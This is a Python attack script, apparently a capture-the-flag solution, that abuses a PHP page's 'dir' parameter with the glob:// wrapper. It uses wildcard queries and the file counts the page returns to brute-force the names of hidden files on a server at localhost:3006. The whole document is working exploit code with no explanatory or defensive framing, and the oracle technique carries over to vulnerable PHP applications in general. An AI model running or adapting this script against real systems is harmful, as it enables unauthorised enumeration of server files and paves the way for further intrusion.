#!/usr/bin/env python3

from pwn import *
import string
import requests
from sys import argv

CHARSET = '.' + string.ascii_letters + string.digits + '!"#$%&\'()+,-:;<=>@[\\]^_`{|}~'
BASE_URL = "http://localhost:3006"

s = requests.Session()

def query_dir(directory):
    r = s.get(url=f"{BASE_URL}/index.php", params={"dir": directory})
    text = r.text
    if "Error" in text:
        raise Exception("Error when querying directory")
    count = int(text.split('<p>')[1].split(' files')[0])
    return count

def glob(pattern):
    return query_dir(f"glob://{pattern}")

def brute_lengths(prefix):
    total_count = glob(prefix + '*')
    i = 0
    pattern = ''
    l = []
    while i < total_count:
        pattern += '?'
        count = glob(prefix + pattern)
        l += [len(pattern)] * count
        i += count
    return set( (x, l.count(x)) for x in l )

def brute_filenames(basedir='.', verbose=False):
    prefix = f"{basedir}/"
    # get length of all filenames first
    lengths = brute_lengths(prefix)
    filenames = []
    for length, len_count in lengths:
        verbose and log.info(f"Length={length}, Length count={len_count}")
        i = 0
        patterns = {i: [(bytearray(b'?' * length), len_count)]}
        while i < length:
            for char in CHARSET:
                done = False
                for pattern, _ in patterns[i]:
                    p = pattern.copy()
                    verbose and log.info(f"Trying char: {char}")
                    p[i] = ord(char)
                    count = glob(prefix + p.decode())
                    if count > 0:
                        log.success(f"Pattern: {p.decode()}")
                        patterns.setdefault(i+1, []).append((p, count))
                        if sum(c for _, c in patterns[i+1]) == len_count:
                            i += 1
                            done = True
                            verbose and log.info(f"Done with {i} : {patterns[i]}")
                            break
                if done:
                    break
            else:
                log.failure("No matching char found")
                exit(1)
        filenames += [ pattern.decode() for pattern, _ in patterns[length] ]
    return filenames

if __name__ == "__main__":
    directory = argv[1] if len(argv) > 1 else "."
    log.info(f"Directory: {directory}")
    filenames = brute_filenames(directory, verbose=False)
    log.success(f"filenames: {filenames}")
